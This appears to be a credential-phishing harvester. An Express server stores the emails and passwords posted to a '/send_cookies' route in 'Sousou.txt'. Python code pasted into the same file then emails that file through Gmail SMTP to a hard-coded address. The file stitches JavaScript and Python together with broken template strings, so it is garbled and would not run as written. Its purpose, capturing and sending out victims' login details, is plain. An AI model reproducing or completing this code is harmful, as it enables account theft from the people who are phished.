const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/send_cookies', (req, res) => {
  const { email, password } = req.body;
  const loginInfo = Email: ${email}, Password: ${password}\n;

  fs.appendFile('Sousou.txt', loginInfo, (err) => {
    if (err) {
      console.error(err);
      res.status(500).send('حدث خطأ أثناء حفظ معلومات تسجيل الدخول.');
    } else {
      console.log('تم حفظ معلومات تسجيل الدخول بنجاح!');
      res.status(200).send('تم حفظ معلومات تسجيل الدخول بنجاح!');
    }
  });
});

// قدم ملف HTML
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// بدء التشغيل
app.listen(port, () => {
  console.log(الخادم يعمل على http://localhost:${port});
});


sender_email = "your_email@gmail.com"
receiver_email = "wacwacsoufiane65@gmail.com"
subject = "Subject of the email"
body = "Body of the email"

# Create the MIME object
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message.attach(MIMEText(body, "plain"))

# Attach the file
file_path = "sousou.txt"
attachment = open(file_path, "rb")
part = MIMEApplication(attachment.read(), Name="sousou.txt")
attachment.close()
message.attach(part)

# Connect to the SMTP server and send the email
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(sender_email, "your_email_password")
    server.sendmail(sender_email, receiver_email, message.as_string())